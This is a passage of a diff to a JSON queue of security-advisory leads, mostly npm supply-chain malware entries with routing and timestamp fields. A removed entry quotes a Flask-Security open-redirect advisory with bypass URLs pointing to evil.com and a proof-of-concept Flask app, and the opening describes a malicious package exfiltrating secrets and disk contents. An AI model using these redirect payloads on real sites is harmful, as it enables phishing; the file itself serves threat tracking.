`ps aux`, listening-port enumeration, MCP probing on localhost:9000, and raw-disk reads from `/dev/vdb`. The package's name targets React developers via a date-utility cover story (empty author field, Chinese comment `绕过能力探测` = 'capability-detection bypass'); none of this behavior is consistent with the advertised purpose. Installer harm is concrete and immediate: any host running `npm install react-simple-utils-kit` leaks process-tree secrets, environment variables of other running processes, kernel/container introspection data, and raw block-device contents to attacker infrastructure. ## Source: ghsa-malware (29295ef35aa59796f637df779516a0382cbe1ce88e69a5c9f40012d9e63c9cfd) Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
-      "sources": [
-        "github-advisory",
-        "osv"
-      ],
-      "sourceRefs": [
-        "https://osv.dev/vulnerability/MAL-2026-6303",
-        "https://github.com/advisories/GHSA-9p56-xfq3-77x5"
-      ],
-      "mergedLeadRefs": [
-        "github-advisory:GHSA-9p56-xfq3-77x5",
-        "osv:MAL-2026-6303"
-      ],
-      "firstSeenAt": "2026-06-23T14:46:34.000Z",
-      "lastMaterialActivityAt": "2026-06-24T15:31:25.229Z",
-      "activityBasis": [
-        "advisory_updated",
-        "active_exploitation_or_malware_signal"
-      ],
-      "entityMatch": "new",
-      "matchedEntityHints": {
-        "actors": [],
-        "campaigns": [],
-        "packages": [],
-        "malwareFamilies": []
-      },
-      "classification": {
-        "leadClass": "current",
-        "leadClassReason": "active status exploited_in_wild; material activity within 180 days",
-        "workIntent": "create_article",
-        "routingPriority": "p0",
-        "effectiveActiveStatus": "exploited_in_wild",
-        "activeStatus": "exploited_in_wild",
-        "activeStatusExpiresAt": "2026-07-24T15:31:25.229Z",
-        "needsReverify": false,
-        "kevStatusDerived": null,
-        "kevStatusIsAuthoredTruth": false,
-        "manualOverrideValid": false,
-        "manualOverrideErrors": []
-      },
-      "rank": 71,
-      "rankReasons": [
-        "current lead",
-        "active exploitation or malware signal",
-        "advisory database signal",
-        "supply-chain term match"
-      ],
-      "queueAction": "candidate_review",
-      "draftingAllowed": false,
-      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
-    },
-    {
       "candidateId": "SC-CAND-92458d52e28083dd",
       "canonicalSubjectId": "MAL-2026-6392",
       "subjectType": "incident",
@@ -768,7 +766,7 @@
       "draftingAllowed": false,
       "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check.",
       "staleCarryForward": true,
-      "carriedForwardAt": "2026-06-24T20:18:07.626Z"
+      "carriedForwardAt": "2026-06-24T21:54:07.136Z"
     },
     {
       "candidateId": "SC-CAND-12f4e0e3b229009f",
@@ -825,7 +823,7 @@
       "draftingAllowed": false,
       "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check.",
       "staleCarryForward": true,
-      "carriedForwardAt": "2026-06-24T20:18:07.626Z"
+      "carriedForwardAt": "2026-06-24T21:54:07.136Z"
     },
     {
       "candidateId": "SC-CAND-65f4696823972d88",
@@ -882,7 +880,7 @@
       "draftingAllowed": false,
       "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check.",
       "staleCarryForward": true,
-      "carriedForwardAt": "2026-06-24T20:18:07.626Z"
+      "carriedForwardAt": "2026-06-24T21:54:07.136Z"
     },
     {
       "candidateId": "SC-CAND-a900f05028bf0714",
@@ -939,7 +937,7 @@
       "draftingAllowed": false,
       "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check.",
       "staleCarryForward": true,
-      "carriedForwardAt": "2026-06-24T20:18:07.626Z"
+      "carriedForwardAt": "2026-06-24T21:54:07.136Z"
     },
     {
       "candidateId": "SC-CAND-4c0066235cddce8e",
@@ -996,7 +994,7 @@
       "draftingAllowed": false,
       "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check.",
       "staleCarryForward": true,
-      "carriedForwardAt": "2026-06-24T20:18:07.626Z"
+      "carriedForwardAt": "2026-06-24T21:54:07.136Z"
     },
     {
       "candidateId": "SC-CAND-110ad0aa9f697bf4",
@@ -1053,7 +1051,60 @@
       "draftingAllowed": false,
       "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check.",
       "staleCarryForward": true,
-      "carriedForwardAt": "2026-06-24T20:18:07.626Z"
+      "carriedForwardAt": "2026-06-24T21:54:07.136Z"
+    },
+    {
+      "candidateId": "SC-CAND-8389aa1b81d5d5a4",
+      "canonicalSubjectId": "GHSA-WFWR-CF4W-FPJ5",
+      "subjectType": "incident",
+      "proposedArchetype": "incident",
+      "title": "Malware in @kl-dolphin/jump",
+      "summary": "Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
+      "sources": [
+        "github-advisory"
+      ],
+      "sourceRefs": [
+        "https://github.com/advisories/GHSA-wfwr-cf4w-fpj5"
+      ],
+      "mergedLeadRefs": [
+        "github-advisory:GHSA-wfwr-cf4w-fpj5"
+      ],
+      "firstSeenAt": "2026-06-24T21:32:21.000Z",
+      "lastMaterialActivityAt": "2026-06-24T21:32:22.000Z",
+      "activityBasis": [
+        "advisory_updated",
+        "active_exploitation_or_malware_signal"
+      ],
+      "entityMatch": "new",
+      "matchedEntityHints": {
+        "actors": [],
+        "campaigns": [],
+        "packages": [],
+        "malwareFamilies": []
+      },
+      "classification": {
+        "leadClass": "current",
+        "leadClassReason": "active status exploited_in_wild; material activity within 180 days",
+        "workIntent": "create_article",
+        "routingPriority": "p1",
+        "effectiveActiveStatus": "exploited_in_wild",
+        "activeStatus": "exploited_in_wild",
+        "activeStatusExpiresAt": "2026-07-24T21:32:22.000Z",
+        "needsReverify": false,
+        "kevStatusDerived": null,
+        "kevStatusIsAuthoredTruth": false,
+        "manualOverrideValid": false,
+        "manualOverrideErrors": []
+      },
+      "rank": 59,
+      "rankReasons": [
+        "current lead",
+        "active exploitation or malware signal",
+        "advisory database signal"
+      ],
+      "queueAction": "candidate_review",
+      "draftingAllowed": false,
+      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
     },
     {
       "candidateId": "SC-CAND-67152acfd91fd840",
@@ -1277,22 +1328,19 @@
       "canonicalSubjectId": "GHSA-9X83-P3MJ-P224",
       "subjectType": "incident",
       "proposedArchetype": "incident",
-      "title": "Malicious code in ui-core-system (npm)",
-      "summary": "--- _-= Per source details. Do not edit below this line.=-_ ## Source: ghsa-malware (5354cae05d6dc20a942310d00c7ae19f0cef2e44c9922322a81a950fdd798c6b) Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
+      "title": "Malware in ui-core-system",
+      "summary": "Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
       "sources": [
-        "github-advisory",
-        "osv"
+        "github-advisory"
       ],
       "sourceRefs": [
-        "https://osv.dev/vulnerability/MAL-2026-6398",
         "https://github.com/advisories/GHSA-9x83-p3mj-p224"
       ],
       "mergedLeadRefs": [
-        "github-advisory:GHSA-9x83-p3mj-p224",
-        "osv:MAL-2026-6398"
+        "github-advisory:GHSA-9x83-p3mj-p224"
       ],
       "firstSeenAt": "2026-06-24T14:43:58.000Z",
-      "lastMaterialActivityAt": "2026-06-24T15:31:25.374Z",
+      "lastMaterialActivityAt": "2026-06-24T14:43:59.000Z",
       "activityBasis": [
         "advisory_updated",
         "active_exploitation_or_malware_signal"
@@ -1311,7 +1359,7 @@
         "routingPriority": "p1",
         "effectiveActiveStatus": "exploited_in_wild",
         "activeStatus": "exploited_in_wild",
-        "activeStatusExpiresAt": "2026-07-24T15:31:25.374Z",
+        "activeStatusExpiresAt": "2026-07-24T14:43:59.000Z",
         "needsReverify": false,
         "kevStatusDerived": null,
         "kevStatusIsAuthoredTruth": false,
@@ -1382,6 +1430,59 @@
       "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
     },
     {
+      "candidateId": "SC-CAND-d937e144c2fd20d0",
+      "canonicalSubjectId": "GHSA-9P56-XFQ3-77X5",
+      "subjectType": "incident",
+      "proposedArchetype": "incident",
+      "title": "Malware in react-simple-utils-kit",
+      "summary": "Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
+      "sources": [
+        "github-advisory"
+      ],
+      "sourceRefs": [
+        "https://github.com/advisories/GHSA-9p56-xfq3-77x5"
+      ],
+      "mergedLeadRefs": [
+        "github-advisory:GHSA-9p56-xfq3-77x5"
+      ],
+      "firstSeenAt": "2026-06-24T14:08:08.000Z",
+      "lastMaterialActivityAt": "2026-06-24T14:08:09.000Z",
+      "activityBasis": [
+        "advisory_updated",
+        "active_exploitation_or_malware_signal"
+      ],
+      "entityMatch": "new",
+      "matchedEntityHints": {
+        "actors": [],
+        "campaigns": [],
+        "packages": [],
+        "malwareFamilies": []
+      },
+      "classification": {
+        "leadClass": "current",
+        "leadClassReason": "active status exploited_in_wild; material activity within 180 days",
+        "workIntent": "create_article",
+        "routingPriority": "p1",
+        "effectiveActiveStatus": "exploited_in_wild",
+        "activeStatus": "exploited_in_wild",
+        "activeStatusExpiresAt": "2026-07-24T14:08:09.000Z",
+        "needsReverify": false,
+        "kevStatusDerived": null,
+        "kevStatusIsAuthoredTruth": false,
+        "manualOverrideValid": false,
+        "manualOverrideErrors": []
+      },
+      "rank": 59,
+      "rankReasons": [
+        "current lead",
+        "active exploitation or malware signal",
+        "advisory database signal"
+      ],
+      "queueAction": "candidate_review",
+      "draftingAllowed": false,
+      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
+    },
+    {
       "candidateId": "SC-CAND-84fd7c55604b73e6",
       "canonicalSubjectId": "GHSA-M55J-V4CF-P5W5",
       "subjectType": "incident",
@@ -1396,6 +1497,59 @@
       ],
       "mergedLeadRefs": [
         "github-advisory:GHSA-m55j-v4cf-p5w5"
+      ],
+      "firstSeenAt": "2026-06-24T14:08:08.000Z",
+      "lastMaterialActivityAt": "2026-06-24T14:08:09.000Z",
+      "activityBasis": [
+        "advisory_updated",
+        "active_exploitation_or_malware_signal"
+      ],
+      "entityMatch": "new",
+      "matchedEntityHints": {
+        "actors": [],
+        "campaigns": [],
+        "packages": [],
+        "malwareFamilies": []
+      },
+      "classification": {
+        "leadClass": "current",
+        "leadClassReason": "active status exploited_in_wild; material activity within 180 days",
+        "workIntent": "create_article",
+        "routingPriority": "p1",
+        "effectiveActiveStatus": "exploited_in_wild",
+        "activeStatus": "exploited_in_wild",
+        "activeStatusExpiresAt": "2026-07-24T14:08:09.000Z",
+        "needsReverify": false,
+        "kevStatusDerived": null,
+        "kevStatusIsAuthoredTruth": false,
+        "manualOverrideValid": false,
+        "manualOverrideErrors": []
+      },
+      "rank": 59,
+      "rankReasons": [
+        "current lead",
+        "active exploitation or malware signal",
+        "advisory database signal"
+      ],
+      "queueAction": "candidate_review",
+      "draftingAllowed": false,
+      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
+    },
+    {
+      "candidateId": "SC-CAND-ed6284dc16b40d22",
+      "canonicalSubjectId": "GHSA-J29F-62X7-HJ66",
+      "subjectType": "incident",
+      "proposedArchetype": "incident",
+      "title": "Malware in date-format-helper2",
+      "summary": "Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
+      "sources": [
+        "github-advisory"
+      ],
+      "sourceRefs": [
+        "https://github.com/advisories/GHSA-j29f-62x7-hj66"
+      ],
+      "mergedLeadRefs": [
+        "github-advisory:GHSA-j29f-62x7-hj66"
       ],
       "firstSeenAt": "2026-06-24T14:08:08.000Z",
       "lastMaterialActivityAt": "2026-06-24T14:08:09.000Z",
@@ -2329,11 +2483,14 @@
       "rankReasons": [
         "current lead",
         "active exploitation or malware signal",
-        "advisory database signal"
+        "advisory database signal",
+        "carried forward pending review"
       ],
       "queueAction": "candidate_review",
       "draftingAllowed": false,
-      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
+      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check.",
+      "staleCarryForward": true,
+      "carriedForwardAt": "2026-06-24T21:54:07.136Z"
     },
     {
       "candidateId": "SC-CAND-14cd1d224a522cf0",
@@ -2389,7 +2546,7 @@
       "draftingAllowed": false,
       "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check.",
       "staleCarryForward": true,
-      "carriedForwardAt": "2026-06-24T20:18:07.626Z"
+      "carriedForwardAt": "2026-06-24T21:54:07.136Z"
     },
     {
       "candidateId": "SC-CAND-91ac5d812d88eef9",
@@ -2577,58 +2734,6 @@
       ],
       "firstSeenAt": "2025-08-26T18:36:42.000Z",
       "lastMaterialActivityAt": "2026-06-24T13:01:46.000Z",
-      "activityBasis": [
-        "advisory_updated"
-      ],
-      "entityMatch": "new",
-      "matchedEntityHints": {
-        "actors": [],
-        "campaigns": [],
-        "packages": [],
-        "malwareFamilies": []
-      },
-      "classification": {
-        "leadClass": "current",
-        "leadClassReason": "material activity within 180 days",
-        "workIntent": "create_article",
-        "routingPriority": "p2",
-        "effectiveActiveStatus": "none",
-        "activeStatus": "none",
-        "activeStatusExpiresAt": null,
-        "needsReverify": false,
-        "kevStatusDerived": null,
-        "kevStatusIsAuthoredTruth": false,
-        "manualOverrideValid": false,
-        "manualOverrideErrors": []
-      },
-      "rank": 46,
-      "rankReasons": [
-        "current lead",
-        "advisory database signal",
-        "supply-chain term match"
-      ],
-      "queueAction": "candidate_review",
-      "draftingAllowed": false,
-      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
-    },
-    {
-      "candidateId": "SC-CAND-d8418a60545e97a7",
-      "canonicalSubjectId": "CVE-2023-49438",
-      "subjectType": "cve",
-      "proposedArchetype": "incident",
-      "title": "Flask-Security has an Open Redirect issue",
-      "summary": "# Open Redirect in Flask-Security ## Summary `flask_security.utils.validate_redirect_url()` can allow an attacker-controlled redirect URL when subdomain redirects are enabled. The bypass uses a backslash inside the URL authority/host: ```text http://evil.com\\.whitelist.com http://evil.com%5C.whitelist.com ``` Python's `urlsplit()` parses the full authority as `evil.com\\.whitelist.com` or `evil.com%5C.whitelist.com`. Because the value ends with `.whitelist.com`, `validate_redirect_url()` accepts it as an allowed subdomain of `whitelist.com`. This is similar in class to the previous Flask-Security-Too open redirect advisory CVE-2023-49438 / GHSA-672h-6x89-76m5, where crafted redirect URLs bypassed validation through browser URL normalization behavior. ## Affected Configuration The issue requires subdomain redirects to be enabled: ```python SERVER_NAME = \"whitelist.com\" SECURITY_REDIRECT_ALLOW_SUBDOMAINS = True ``` Tested environment: ```text Flask-Security: 5.8.0 Flask: 3.1.3 Werkzeug: 3.1.8 ``` ## Impact An attacker can craft a URL that passes Flask-Security's redirect validation and produces a `302` response to an attacker-controlled URL-like authority. This can be used for phishing or other attacks that rely on a trusted application redirecting users to an attacker-controlled destination. ## Proof of Concept ### PoC Flask App ```python from __future__ import annotations from importlib.metadata import version from urllib.parse import urlsplit from flask import Flask, jsonify, redirect, request from flask_security.utils import validate_redirect_url app = Flask(__name__) app.config.update( SECRET_KEY=\"poc-only\", SERVER_NAME=\"whitelist.com\", SECURITY_REDIRECT_ALLOW_SUBDOMAINS=True, SECURITY_REDIRECT_BASE_DOMAIN=None, SECURITY_REDIRECT_ALLOWED_SUBDOMAINS=[], ) @app.get(\"/\") def index(): return jsonify( flask_version=version(\"Flask\"), configured_server_name=app.config[\"SERVER_NAME\"], examples=[ r\"http://evil.com\\.whitelist.com\", \"http://evil.com%5C.whitelist.com\", \"http://sub.whitelist.com\", \"http://sub.not-whitelist.com\", ], ) @app.get(\"/check\") def check(): next_url = request.args.get(\"next\", \"\") parsed = urlsplit(next_url) return jsonify( next=next_url, valid=validate_redirect_url(next_url), parsed={ \"scheme\": parsed.scheme, \"netloc\": parsed.netloc, \"hostname\": parsed.hostname, \"path\": parsed.path, }, ) @app.get(\"/redir\") def redir(): next_url = request.args.get(\"next\", \"\") if not validate_redirect_url(next_url): return jsonify(error=\"blocked\", next=next_url), 400 return redirect(next_url) if __name__ == \"__main__\": app.run(host=\"127.0.0.1\", port=5000, debug=False) ``` ### Steps to Reproduce Run the PoC with the target project's Flask version: ```bash .venv/bin/python poc_redirect_app.py ``` The invalid comparison case is correctly blocked: ```bash http://127.0.0.1:5000/redir?next=http://evil.com ``` Observed result: <img width=\"1019\" height=\"294\" alt=\"image\" src=\"https://github.com/user-attachments/assets/de25ac4d-b37f-4369-928e-f44dfd5b7557\" /> Check the validation result: ```bash http://127.0.0.1:5000/check?next=http://evil.com%5C.whitelist.com ``` Observed result: <img width=\"1029\" height=\"634\" alt=\"image\" src=\"https://github.com/user-attachments/assets/8e5ec8a6-42a4-438a-8d12-a27724519091\" /> ## References - CVE-2023-49438: https://advisories.gitlab.com/pypi/flask-security-too/CVE-2023-49438/ - GHSA-672h-6x89-76m5: https://osv.dev/vulnerability/CVE-2023-49438 - NVD entry for CVE-2023-49438: https://nvd.nist.gov/vuln/detail/CVE-2023-49438",
-      "sources": [
-        "github-advisory"
-      ],
-      "sourceRefs": [
-        "https://github.com/advisories/GHSA-w2j7-f3c6-g8cw"
-      ],
-      "mergedLeadRefs": [
-        "github-advisory:GHSA-w2j7-f3c6-g8cw"
-      ],
-      "firstSeenAt": "2026-06-23T22:46:31.000Z",
-      "lastMaterialActivityAt": "2026-06-23T22:46:32.000Z",
       "activityBasis": [
         "advisory_updated"
       ],
